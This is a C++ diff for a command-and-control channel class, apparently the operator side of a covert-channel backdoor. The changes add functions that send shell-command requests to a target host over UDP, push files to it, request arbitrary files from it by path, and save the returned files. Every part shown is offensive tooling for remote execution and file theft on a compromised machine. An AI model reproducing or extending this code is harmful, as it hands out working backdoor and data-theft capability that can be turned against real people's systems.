@@ -48,11 +48,11 @@ bool Cnc_Channel::parse_command(Job& j){
     }
 
     switch(cmd) {
-        case CMD::ret_cmd :
+        case CMD::return_command :
            handle_ret_cmd(j);
            break; //optional
-        case CMD::ret_file :
-            //handle_get_file(command_arg);
+        case CMD::return_file :
+            handle_return_file(j);
             break; //optional
         default :
             cout << "parse_command default switch case " << endl;
@@ -66,13 +66,35 @@ bool Cnc_Channel::handle_ret_cmd(Job& j){
     return true;
 }
 
+bool Cnc_Channel::handle_return_file(Job& j){
+    split_command_argument_with_regex(j.argument, j);
+    Utilities::writefile(j.command, j.argument);
+    return true;
+}
+
 
 bool Cnc_Channel::send_run_cmd(string cmd){
     string request;
     request += '[';
-    request += cmdMap.left.find(CMD::run_cmd)->second;
+    request += cmdMap.left.find(CMD::run_command)->second;
     request += ']';
     request += cmd;
+    std::vector<unsigned char> hidden(request.begin(), request.end());
+    udp_send(config.target_addr.ip, config.target_addr.port, hidden);
+    return true;
+}
+
+bool Cnc_Channel::send_file(string filename){
+    Covert_Channel::send_file(config.target_addr.ip, config.target_addr.port, filename);
+    return true;
+}
+
+bool Cnc_Channel::get_file(string filepath){
+    string request;
+    request += '[';
+    request += cmdMap.left.find(CMD::get_file)->second;
+    request += ']';
+    request += filepath;
     std::vector<unsigned char> hidden(request.begin(), request.end());
     udp_send(config.target_addr.ip, config.target_addr.port, hidden);
     return true;
